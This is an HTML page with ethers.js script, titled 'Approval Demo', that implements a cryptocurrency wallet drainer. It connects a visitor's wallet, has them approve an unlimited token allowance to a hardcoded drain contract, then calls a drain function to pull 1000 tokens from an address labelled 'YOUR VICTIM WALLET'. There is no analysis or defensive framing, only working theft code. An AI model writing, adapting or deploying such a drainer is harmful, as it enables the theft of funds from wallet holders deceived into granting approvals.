<!DOCTYPE html>
<html>
<head>
  <title>Approval Demo</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
</head>
<body style="font-family:sans-serif">

<h2>Demo: Connect → Approve → Drain</h2>

<button onclick="connect()">Connect Wallet</button><br><br>

<button onclick="approve()">Approve Token</button><br><br>

<button onclick="drain()">Drain Tokens</button>

<script>
let provider, signer;

const tokenAddress = "0x089d6677646bc535B1A8535ED856bb17493E332d";
const drainAddress = "0x0ccb058f48f5caa16c7026e7d34c103544c2d172";

// 👇 YOUR VICTIM WALLET
const victimAddress = "0xb52d3770bcf4673009f2f6bf8ba9177cba46d283";

const tokenABI = [
  "function approve(address spender, uint256 amount) public returns (bool)"
];

const drainABI = [
  "function drain(address token, address victim, uint256 amount) public"
];

async function connect() {
  try {
    if (!window.ethereum) {
      alert("Open inside Trust Wallet or MetaMask browser");
      return;
    }

    await window.ethereum.request({ method: "eth_requestAccounts" });

    provider = new ethers.providers.Web3Provider(window.ethereum);
    signer = provider.getSigner();

    const address = await signer.getAddress();
    console.log("Connected:", address);

    alert("Wallet connected: " + address);

  } catch (e) {
    console.error(e);
    alert("Connect error: " + e.message);
  }
}

async function approve() {
  try {
    console.log("Approving...");

    const contract = new ethers.Contract(tokenAddress, tokenABI, signer);

    const tx = await contract.approve(
      drainAddress,
      ethers.constants.MaxUint256
    );

    console.log("TX:", tx);

    await tx.wait();

    alert("✅ Approved successfully");

  } catch (e) {
    console.error(e);
    alert("❌ Approve error: " + e.message);
  }
}

async function drain() {
  try {
    console.log("Draining...");

    const contract = new ethers.Contract(drainAddress, drainABI, signer);

    const tx = await contract.drain(
      tokenAddress,
      victimAddress,
      ethers.utils.parseUnits("1000", 18)
    );

    console.log("TX:", tx);

    await tx.wait();

    alert("💣 Drain executed");

  } catch (e) {
    console.error(e);
    alert("❌ Drain error: " + e.message);
  }
}
</script>

</body>
</html>
